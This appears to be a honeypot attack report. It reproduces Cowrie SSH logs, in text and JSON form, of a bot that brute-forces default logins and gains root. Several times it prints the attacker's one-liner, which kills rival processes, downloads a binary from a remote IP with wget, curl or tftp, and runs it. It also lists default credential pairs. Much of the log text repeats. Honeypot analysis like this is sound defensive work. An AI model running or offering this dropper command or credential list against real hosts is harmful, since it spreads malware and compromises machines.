2023-11-30T01:41:55.750345Z [HoneyPotSSHTransport,43,204.76.203.13] login attempt [b'admin'/b'password'] failed
2023-11-30T01:41:58.998769Z [HoneyPotSSHTransport,43,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:41:58.999284Z [HoneyPotSSHTransport,43,204.76.203.13] Connection lost after 3 seconds
2023-11-30T01:41:59.075196Z [HoneyPotSSHTransport,44,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:02.031931Z [HoneyPotSSHTransport,44,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:03.676742Z [HoneyPotSSHTransport,44,204.76.203.13] login attempt: 3
2023-11-30T01:42:03.714830Z [HoneyPotSSHTransport,44,204.76.203.13] login attempt [b'ubnt'/b'ubnt'] failed
2023-11-30T01:42:04.792951Z [HoneyPotSSHTransport,44,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:42:04.793713Z [HoneyPotSSHTransport,44,204.76.203.13] Connection lost after 5 seconds
2023-11-30T01:42:04.868721Z [HoneyPotSSHTransport,45,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:04.944538Z [HoneyPotSSHTransport,45,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:05.336281Z [HoneyPotSSHTransport,45,204.76.203.13] login attempt: 4
2023-11-30T01:42:05.373678Z [HoneyPotSSHTransport,45,204.76.203.13] login attempt [b'admin'/b'123456'] failed
2023-11-30T01:42:06.452556Z [HoneyPotSSHTransport,45,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:42:06.453447Z [HoneyPotSSHTransport,45,204.76.203.13] Connection lost after 1 seconds
2023-11-30T01:42:06.528321Z [HoneyPotSSHTransport,46,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:06.603497Z [HoneyPotSSHTransport,46,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:06.955516Z [HoneyPotSSHTransport,46,204.76.203.13] login attempt: 5
2023-11-30T01:42:06.993253Z [HoneyPotSSHTransport,46,204.76.203.13] login attempt [b'root'/b'root'] succeeded
2023-11-30T01:42:06.994875Z [HoneyPotSSHTransport,46,204.76.203.13] Initialized emulated server as architecture: linux-x64-lsb
2023-11-30T01:42:07.264680Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: enable
2023-11-30T01:42:07.265628Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: enable 
2023-11-30T01:42:07.265865Z [HoneyPotSSHTransport,46,204.76.203.13] Reading txtcmd from "share/cowrie/txtcmds/bin/enable"
2023-11-30T01:42:07.342616Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: system
2023-11-30T01:42:07.343443Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command system
2023-11-30T01:42:07.343543Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: system
2023-11-30T01:42:07.344757Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: shell
2023-11-30T01:42:07.345442Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command shell
2023-11-30T01:42:07.345546Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: shell
2023-11-30T01:42:07.346481Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: sh
2023-11-30T01:42:07.346943Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: sh 
2023-11-30T01:42:07.348235Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: linuxshell
2023-11-30T01:42:07.348894Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command linuxshell
2023-11-30T01:42:07.349000Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: linuxshell
2023-11-30T01:42:07.354857Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: cd /tmp/; echo "senpai" > rootsenpai; cat rootsenpai; rm -rf rootsenpai
2023-11-30T01:42:07.355450Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: cd /tmp/
2023-11-30T01:42:07.355807Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: echo senpai > rootsenpai
2023-11-30T01:42:07.356814Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: cat rootsenpai
2023-11-30T01:42:07.357419Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: rm -rf rootsenpai
2023-11-30T01:42:07.457483Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: for dir in /proc/[0-9]*; do grep -q "(deleted)" "$dir/maps" && echo "Killing process with PID: $(basename $dir)" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah
2023-11-30T01:42:07.458423Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: basename $dir
2023-11-30T01:42:07.459906Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command basename
2023-11-30T01:42:07.460015Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: basename $dir
2023-11-30T01:42:07.460604Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: basename $dir
2023-11-30T01:42:07.461305Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command basename
2023-11-30T01:42:07.461404Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: basename $dir
2023-11-30T01:42:07.462372Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command for
2023-11-30T01:42:07.462472Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: for dir in /proc/ [ 0-9 ] *
2023-11-30T01:42:07.463164Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command deleted
2023-11-30T01:42:07.463262Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: deleted $dir/maps
2023-11-30T01:42:07.463781Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: echo Killing process with PID: 
2023-11-30T01:42:07.464210Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: kill -9 
2023-11-30T01:42:07.464521Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: done ;; rm -rf ah
2023-11-30T01:42:07.464818Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: wget http://94.156.68.152/ah
2023-11-30T01:42:57.566448Z [HoneyPotSSHTransport,46,204.76.203.13] Saved redir contents with SHA-256 199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8 to var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8
2023-11-30T01:42:57.567406Z [HoneyPotSSHTransport,46,204.76.203.13] Closing TTY Log: var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f after 50 seconds
2023-11-30T01:42:57.643590Z [HoneyPotSSHTransport,46,204.76.203.13] avatar root logging out
2023-11-30T01:42:57.643806Z [HoneyPotSSHTransport,46,204.76.203.13] Connection lost after 51 seconds
2023-11-30T01:41:53.571325Z [HoneyPotSSHTransport,42,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:41:53.647609Z [HoneyPotSSHTransport,42,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:41:54.047697Z [HoneyPotSSHTransport,42,204.76.203.13] first time for 204.76.203.13, need: 5
2023-11-30T01:41:54.047814Z [HoneyPotSSHTransport,42,204.76.203.13] login attempt: 1
2023-11-30T01:41:54.085794Z [HoneyPotSSHTransport,42,204.76.203.13] login attempt [b'admin'/b'admin'] failed
2023-11-30T01:41:55.166312Z [HoneyPotSSHTransport,42,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:41:55.166817Z [HoneyPotSSHTransport,42,204.76.203.13] Connection lost after 1 seconds
2023-11-30T01:41:55.242107Z [HoneyPotSSHTransport,43,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:41:55.317557Z [HoneyPotSSHTransport,43,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:41:55.711661Z [HoneyPotSSHTransport,43,204.76.203.13] login attempt: 2
2023-11-30T01:41:55.750345Z [HoneyPotSSHTransport,43,204.76.203.13] login attempt [b'admin'/b'password'] failed
2023-11-30T01:41:58.998769Z [HoneyPotSSHTransport,43,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:41:58.999284Z [HoneyPotSSHTransport,43,204.76.203.13] Connection lost after 3 seconds
2023-11-30T01:41:59.075196Z [HoneyPotSSHTransport,44,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:02.031931Z [HoneyPotSSHTransport,44,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:03.676742Z [HoneyPotSSHTransport,44,204.76.203.13] login attempt: 3
2023-11-30T01:42:03.714830Z [HoneyPotSSHTransport,44,204.76.203.13] login attempt [b'ubnt'/b'ubnt'] failed
2023-11-30T01:42:04.792951Z [HoneyPotSSHTransport,44,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:42:04.793713Z [HoneyPotSSHTransport,44,204.76.203.13] Connection lost after 5 seconds
2023-11-30T01:42:04.868721Z [HoneyPotSSHTransport,45,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:04.944538Z [HoneyPotSSHTransport,45,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:05.336281Z [HoneyPotSSHTransport,45,204.76.203.13] login attempt: 4
2023-11-30T01:42:05.373678Z [HoneyPotSSHTransport,45,204.76.203.13] login attempt [b'admin'/b'123456'] failed
2023-11-30T01:42:06.452556Z [HoneyPotSSHTransport,45,204.76.203.13] Got remote error, code 11 reason: b'end'
2023-11-30T01:42:06.453447Z [HoneyPotSSHTransport,45,204.76.203.13] Connection lost after 1 seconds
2023-11-30T01:42:06.528321Z [HoneyPotSSHTransport,46,204.76.203.13] Remote SSH version: SSH-2.0-libssh2_1.10.0
2023-11-30T01:42:06.603497Z [HoneyPotSSHTransport,46,204.76.203.13] SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e
2023-11-30T01:42:06.955516Z [HoneyPotSSHTransport,46,204.76.203.13] login attempt: 5
2023-11-30T01:42:06.993253Z [HoneyPotSSHTransport,46,204.76.203.13] login attempt [b'root'/b'root'] succeeded
2023-11-30T01:42:06.994875Z [HoneyPotSSHTransport,46,204.76.203.13] Initialized emulated server as architecture: linux-x64-lsb
2023-11-30T01:42:07.264680Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: enable
2023-11-30T01:42:07.265628Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: enable 
2023-11-30T01:42:07.265865Z [HoneyPotSSHTransport,46,204.76.203.13] Reading txtcmd from "share/cowrie/txtcmds/bin/enable"
2023-11-30T01:42:07.342616Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: system
2023-11-30T01:42:07.343443Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command system
2023-11-30T01:42:07.343543Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: system
2023-11-30T01:42:07.344757Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: shell
2023-11-30T01:42:07.345442Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command shell
2023-11-30T01:42:07.345546Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: shell
2023-11-30T01:42:07.346481Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: sh
2023-11-30T01:42:07.346943Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: sh 
2023-11-30T01:42:07.348235Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: linuxshell
2023-11-30T01:42:07.348894Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command linuxshell
2023-11-30T01:42:07.349000Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: linuxshell
2023-11-30T01:42:07.354857Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: cd /tmp/; echo "senpai" > rootsenpai; cat rootsenpai; rm -rf rootsenpai
2023-11-30T01:42:07.355450Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: cd /tmp/
2023-11-30T01:42:07.355807Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: echo senpai > rootsenpai
2023-11-30T01:42:07.356814Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: cat rootsenpai
2023-11-30T01:42:07.357419Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: rm -rf rootsenpai
2023-11-30T01:42:07.457483Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: for dir in /proc/[0-9]*; do grep -q "(deleted)" "$dir/maps" && echo "Killing process with PID: $(basename $dir)" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah
2023-11-30T01:42:07.458423Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: basename $dir
2023-11-30T01:42:07.459906Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command basename
2023-11-30T01:42:07.460015Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: basename $dir
2023-11-30T01:42:07.460604Z [HoneyPotSSHTransport,46,204.76.203.13] CMD: basename $dir
2023-11-30T01:42:07.461305Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command basename
2023-11-30T01:42:07.461404Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: basename $dir
2023-11-30T01:42:07.462372Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command for
2023-11-30T01:42:07.462472Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: for dir in /proc/ [ 0-9 ] *
2023-11-30T01:42:07.463164Z [HoneyPotSSHTransport,46,204.76.203.13] Can't find command deleted
2023-11-30T01:42:07.463262Z [HoneyPotSSHTransport,46,204.76.203.13] Command not found: deleted $dir/maps
2023-11-30T01:42:07.463781Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: echo Killing process with PID: 
2023-11-30T01:42:07.464210Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: kill -9 
2023-11-30T01:42:07.464521Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: done ;; rm -rf ah
2023-11-30T01:42:07.464818Z [HoneyPotSSHTransport,46,204.76.203.13] Command found: wget http://94.156.68.152/ah
2023-11-30T01:42:57.566448Z [HoneyPotSSHTransport,46,204.76.203.13] Saved redir contents with SHA-256 199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8 to var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8
2023-11-30T01:42:57.567406Z [HoneyPotSSHTransport,46,204.76.203.13] Closing TTY Log: var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f after 50 seconds
2023-11-30T01:42:57.643590Z [HoneyPotSSHTransport,46,204.76.203.13] avatar root logging out
2023-11-30T01:42:57.643806Z [HoneyPotSSHTransport,46,204.76.203.13] Connection lost after 51 seconds

```

</details>

---

COMMENTARY ON LOGS

## Cowrie .json Logs
Total Cowrie logs: `376`

#### First Session With Commands 651b145b8fb8 Cowrie .json Logs
This sample shows the Cowrie `.json` Logs for session_id `651b145b8fb8` the first session in this attack where the attacker exectuted commands in on the honeypot system.Here is the full log:

<details>
<summary>
<h3>Cowrie .json Logs for 651b145b8fb8</h3>
</summary>


```json
{"eventid":"cowrie.session.connect","src_ip":"204.76.203.13","src_port":54330,"dst_ip":"172.31.5.68","dst_port":2222,"session":"651b145b8fb8","protocol":"ssh","message":"New connection: 204.76.203.13:54330 (172.31.5.68:2222) [session: 651b145b8fb8]","sensor":"","timestamp":"2023-11-30T01:42:06.527180Z"}
{"eventid":"cowrie.client.version","version":"SSH-2.0-libssh2_1.10.0","message":"Remote SSH version: SSH-2.0-libssh2_1.10.0","sensor":"","timestamp":"2023-11-30T01:42:06.528321Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.client.kex","hassh":"63ae64767f334c6a74647d80edb0291e","hasshAlgorithms":"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,diffie-hellman-group-exchange-sha1;aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc,none;hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com,none;none","kexAlgs":["curve25519-sha256","curve25519-sha256@libssh.org","ecdh-sha2-nistp256","ecdh-sha2-nistp384","ecdh-sha2-nistp521","diffie-hellman-group-exchange-sha256","diffie-hellman-group16-sha512","diffie-hellman-group18-sha512","diffie-hellman-group14-sha256","diffie-hellman-group14-sha1","diffie-hellman-group1-sha1","diffie-hellman-group-exchange-sha1"],"keyAlgs":["ecdsa-sha2-nistp256","ecdsa-sha2-nistp384","ecdsa-sha2-nistp521","ecdsa-sha2-nistp256-cert-v01@openssh.com","ecdsa-sha2-nistp384-cert-v01@openssh.com","ecdsa-sha2-nistp521-cert-v01@openssh.com","ssh-ed25519","ssh-rsa","ssh-dss"],"encCS":["aes128-ctr","aes192-ctr","aes256-ctr","aes256-cbc","rijndael-cbc@lysator.liu.se","aes192-cbc","aes128-cbc","blowfish-cbc","arcfour128","arcfour","cast128-cbc","3des-cbc","none"],"macCS":["hmac-sha2-256","hmac-sha2-512","hmac-sha1","hmac-sha1-96","hmac-md5","hmac-md5-96","hmac-ripemd160","hmac-ripemd160@openssh.com","none"],"compCS":["none"],"langCS":[""],"message":"SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e","sensor":"","timestamp":"2023-11-30T01:42:06.603497Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.login.success","username":"root","password":"root","message":"login attempt [root/root] succeeded","sensor":"","timestamp":"2023-11-30T01:42:06.993253Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.params","arch":"linux-x64-lsb","message":[],"sensor":"","timestamp":"2023-11-30T01:42:07.187733Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"enable","message":"CMD: enable","sensor":"","timestamp":"2023-11-30T01:42:07.264680Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"system","message":"CMD: system","sensor":"","timestamp":"2023-11-30T01:42:07.342616Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"system","message":"Command not found: system","sensor":"","timestamp":"2023-11-30T01:42:07.343543Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"shell","message":"CMD: shell","sensor":"","timestamp":"2023-11-30T01:42:07.344757Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"shell","message":"Command not found: shell","sensor":"","timestamp":"2023-11-30T01:42:07.345546Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"sh","message":"CMD: sh","sensor":"","timestamp":"2023-11-30T01:42:07.346481Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"linuxshell","message":"CMD: linuxshell","sensor":"","timestamp":"2023-11-30T01:42:07.348235Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"linuxshell","message":"Command not found: linuxshell","sensor":"","timestamp":"2023-11-30T01:42:07.349000Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"cd /tmp/; echo \"senpai\" > rootsenpai; cat rootsenpai; rm -rf rootsenpai","message":"CMD: cd /tmp/; echo \"senpai\" > rootsenpai; cat rootsenpai; rm -rf rootsenpai","sensor":"","timestamp":"2023-11-30T01:42:07.354857Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"for dir in /proc/[0-9]*; do grep -q \"(deleted)\" \"$dir/maps\" && echo \"Killing process with PID: $(basename $dir)\" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah","message":"CMD: for dir in /proc/[0-9]*; do grep -q \"(deleted)\" \"$dir/maps\" && echo \"Killing process with PID: $(basename $dir)\" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah","sensor":"","timestamp":"2023-11-30T01:42:07.457483Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"basename $dir","message":"CMD: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.458423Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"basename $dir","message":"Command not found: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.460015Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"basename $dir","message":"CMD: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.460604Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"basename $dir","message":"Command not found: basename $dir","sensor":"","timestamp":"2023-11-30T01:42:07.461404Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"for dir in /proc/ [ 0-9 ] *","message":"Command not found: for dir in /proc/ [ 0-9 ] *","sensor":"","timestamp":"2023-11-30T01:42:07.462472Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"deleted $dir/maps","message":"Command not found: deleted $dir/maps","sensor":"","timestamp":"2023-11-30T01:42:07.463262Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","url":"http://94.156.68.152/ah","outfile":"var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","shasum":"fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","sensor":"","timestamp":"2023-11-30T01:42:07.748981Z","message":"Downloaded URL (http://94.156.68.152/ah) with SHA-256 fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054 to var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","url":"http://94.156.68.152/ah","outfile":"var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","shasum":"fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","sensor":"","timestamp":"2023-11-30T01:42:08.032984Z","message":"Downloaded URL (http://94.156.68.152/ah) with SHA-256 fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054 to var/lib/cowrie/downloads/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download.failed","url":"http://94.156.68.152/ah","sensor":"","timestamp":"2023-11-30T01:42:23.066389Z","message":"Attempt to download file(s) from URL (http://94.156.68.152/ah) failed","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.file_download","duplicate":false,"outfile":"var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","shasum":"199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","destfile":"/tmp/rootsenpai","message":"Saved redir contents with SHA-256 199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8 to var/lib/cowrie/downloads/199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8","sensor":"","timestamp":"2023-11-30T01:42:57.566448Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.log.closed","ttylog":"var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f","size":2745,"shasum":"35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f","duplicate":false,"duration":50.38083243370056,"message":"Closing TTY Log: var/lib/cowrie/tty/35418a8d6dcb23a0ee6716fc1f7ae2255bd9f34584706ff5b8c6f8f42b98100f after 50 seconds","sensor":"","timestamp":"2023-11-30T01:42:57.567406Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.closed","duration":51.115936279296875,"message":"Connection lost after 51 seconds","sensor":"","timestamp":"2023-11-30T01:42:57.643806Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.connect","src_ip":"204.76.203.13","src_port":54330,"dst_ip":"172.31.5.68","dst_port":2222,"session":"651b145b8fb8","protocol":"ssh","message":"New connection: 204.76.203.13:54330 (172.31.5.68:2222) [session: 651b145b8fb8]","sensor":"","timestamp":"2023-11-30T01:42:06.527180Z"}
{"eventid":"cowrie.client.version","version":"SSH-2.0-libssh2_1.10.0","message":"Remote SSH version: SSH-2.0-libssh2_1.10.0","sensor":"","timestamp":"2023-11-30T01:42:06.528321Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.client.kex","hassh":"63ae64767f334c6a74647d80edb0291e","hasshAlgorithms":"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,diffie-hellman-group-exchange-sha1;aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc,none;hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com,none;none","kexAlgs":["curve25519-sha256","curve25519-sha256@libssh.org","ecdh-sha2-nistp256","ecdh-sha2-nistp384","ecdh-sha2-nistp521","diffie-hellman-group-exchange-sha256","diffie-hellman-group16-sha512","diffie-hellman-group18-sha512","diffie-hellman-group14-sha256","diffie-hellman-group14-sha1","diffie-hellman-group1-sha1","diffie-hellman-group-exchange-sha1"],"keyAlgs":["ecdsa-sha2-nistp256","ecdsa-sha2-nistp384","ecdsa-sha2-nistp521","ecdsa-sha2-nistp256-cert-v01@openssh.com","ecdsa-sha2-nistp384-cert-v01@openssh.com","ecdsa-sha2-nistp521-cert-v01@openssh.com","ssh-ed25519","ssh-rsa","ssh-dss"],"encCS":["aes128-ctr","aes192-ctr","aes256-ctr","aes256-cbc","rijndael-cbc@lysator.liu.se","aes192-cbc","aes128-cbc","blowfish-cbc","arcfour128","arcfour","cast128-cbc","3des-cbc","none"],"macCS":["hmac-sha2-256","hmac-sha2-512","hmac-sha1","hmac-sha1-96","hmac-md5","hmac-md5-96","hmac-ripemd160","hmac-ripemd160@openssh.com","none"],"compCS":["none"],"langCS":[""],"message":"SSH client hassh fingerprint: 63ae64767f334c6a74647d80edb0291e","sensor":"","timestamp":"2023-11-30T01:42:06.603497Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.login.success","username":"root","password":"root","message":"login attempt [root/root] succeeded","sensor":"","timestamp":"2023-11-30T01:42:06.993253Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.session.params","arch":"linux-x64-lsb","message":[],"sensor":"","timestamp":"2023-11-30T01:42:07.187733Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"enable","message":"CMD: enable","sensor":"","timestamp":"2023-11-30T01:42:07.264680Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"system","message":"CMD: system","sensor":"","timestamp":"2023-11-30T01:42:07.342616Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.failed","input":"system","message":"Command not found: system","sensor":"","timestamp":"2023-11-30T01:42:07.343543Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
{"eventid":"cowrie.command.input","input":"shell","message":"CMD: shell","sensor":"","timestamp":"2023-11-30T01:42:07.344757Z","src_ip":"204.76.203.13","session":"651b145b8fb8"}
